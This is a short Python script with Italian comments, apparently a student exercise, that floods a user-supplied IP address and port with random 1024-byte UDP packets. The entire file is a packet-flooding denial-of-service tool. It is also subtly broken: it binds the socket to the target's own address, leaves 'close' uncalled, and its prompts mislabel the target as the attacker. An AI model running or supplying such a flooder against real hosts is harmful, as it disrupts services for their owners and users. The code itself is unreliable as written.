import socket                                                   #importazione delle librerie necessarie per comunicazione e inserimento dati casuali
import random                                                   

target = input ("\n\nInserire indirizzo IP attaccante: ")        
port = int (input("\n\nInserire porta attaccante: "))

num_p = int (input("\n\nInserire numero pacchetti da inviare: "))          
i=0                                                                        

while 1:
	s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)        #Definizione variabile
	s.bind((target, port))                                    #Bound socket\target e porta
	data= random.randbytes(1024)                              #Dati resi casuali per mandare il numero di byte
	addr=(str(target), int (port))
	while i<num_p:                                                 #ciclo invio packets
		s.sendto(data,addr)                                 # Invio data/address
		i=i+1
	s.close                                                   #chiusura
	quit()                                                    #fine